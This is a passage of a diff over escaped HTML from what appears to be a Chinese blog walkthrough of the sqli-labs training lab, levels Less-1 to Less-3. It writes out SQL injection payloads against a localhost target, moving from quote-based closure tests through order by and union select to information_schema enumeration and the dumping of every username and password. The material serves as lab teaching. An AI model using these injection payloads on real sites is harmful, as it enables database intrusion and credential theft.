 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160914.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313160914&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160914.png&#34; alt=&#34;Pasted image 20250313160914&#34;&gt;&lt;br&gt;
 构造&lt;code&gt;?id=1&#39; order by 4 --+&lt;/code&gt;页面显示错误信息，由此可知该表&lt;strong&gt;字段数为3&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1624,16 +991,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161001.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161001&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161001.png&#34; alt=&#34;Pasted image 20250313161001&#34;&gt;&lt;br&gt;
 6.构造&lt;code&gt;?id=-1&#39; union select 1,2,3 --+&lt;/code&gt;判断出&lt;strong&gt;回显点为该表的第二、三字段&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1643,16 +1001,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161256.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161256&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161256.png&#34; alt=&#34;Pasted image 20250313161256&#34;&gt;&lt;br&gt;
 7.构造&lt;code&gt;?id=-1&#39; union select 1,2,database() --+&lt;/code&gt;知道了&lt;strong&gt;数据库名为security&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1662,16 +1011,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161350.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161350&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161350.png&#34; alt=&#34;Pasted image 20250313161350&#34;&gt;&lt;br&gt;
 8.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1682,16 +1022,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161444.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161444&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161444.png&#34; alt=&#34;Pasted image 20250313161444&#34;&gt;&lt;br&gt;
 9.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1702,16 +1033,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;在数据库information_schema中的columns里查找出数据库security中的users表的全部字段&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161527.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161527&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161527.png&#34; alt=&#34;Pasted image 20250313161527&#34;&gt;&lt;br&gt;
 10.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1722,30 +1044,12 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;爆出所有的用户名和密码&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161635.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161635&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-2&#34;&gt;Less-2
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：&lt;code&gt;&amp;lt;payload&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161635.png&#34; alt=&#34;Pasted image 20250313161635&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-2&#34;&gt;Less-2&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：&lt;code&gt;&amp;lt;payload&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
 与第一关基本一样，就 &lt;code&gt;id&lt;/code&gt; 不用闭合&lt;br&gt;
 1.进入第二题，显示&lt;code&gt;Please input the ID as parameter with numeric value&lt;/code&gt;，告诉了我们参数为&lt;strong&gt;id&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161818.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161818&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161818.png&#34; alt=&#34;Pasted image 20250313161818&#34;&gt;&lt;br&gt;
 2.构造&lt;code&gt;?id=1&lt;/code&gt;,页面显示正常&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1755,16 +1059,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161840.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161840&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161840.png&#34; alt=&#34;Pasted image 20250313161840&#34;&gt;&lt;br&gt;
 3.接下来加个单引号，显示语句出错，根据报错信息可以得知是&lt;code&gt;单引号&lt;/code&gt;影响了SQL语句的闭合，由此判断出这题是&lt;strong&gt;数字型注入&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1774,16 +1069,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161910.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313161910&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161910.png&#34; alt=&#34;Pasted image 20250313161910&#34;&gt;&lt;br&gt;
 4.构造&lt;code&gt;?id=1 order by 3 --+&lt;/code&gt;通过order by子句来判断该数据表的字段数&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1813,16 +1099,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,3 --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162206.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313162206&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162206.png&#34; alt=&#34;Pasted image 20250313162206&#34;&gt;&lt;br&gt;
 6.构造&lt;code&gt;?id=-1 union select 1,2,database() --+&lt;/code&gt;知道了数据库名为security&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1832,16 +1109,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162325.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313162325&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162325.png&#34; alt=&#34;Pasted image 20250313162325&#34;&gt;&lt;br&gt;
 7.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1852,16 +1120,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在数据库information_schema中的tables表里查询出security数据库的表有：&lt;strong&gt;emails,referers,uagents,users&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162432.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313162432&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162432.png&#34; alt=&#34;Pasted image 20250313162432&#34;&gt;&lt;br&gt;
 8.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1872,16 +1131,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在数据库information_schema中的columns里查找出数据库&lt;strong&gt;security中的users表的全部字段&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162527.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313162527&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162527.png&#34; alt=&#34;Pasted image 20250313162527&#34;&gt;&lt;br&gt;
 9.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1892,30 +1142,12 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;爆出所有的用户名和密码&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162629.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313162629&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-3&#34;&gt;Less-3
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39;) &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162629.png&#34; alt=&#34;Pasted image 20250313162629&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-3&#34;&gt;Less-3&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39;) &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
 也是闭合符号不一样&lt;br&gt;
 1.进入第三题，显示&lt;code&gt;Please input the ID as parameter with numeric value&lt;/code&gt;，告诉了我们参数为&lt;strong&gt;id&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162714.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313162714&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162714.png&#34; alt=&#34;Pasted image 20250313162714&#34;&gt;&lt;br&gt;
 2.构造&lt;code&gt;?id=1&lt;/code&gt;,页面显示正常。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1935,16 +1167,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
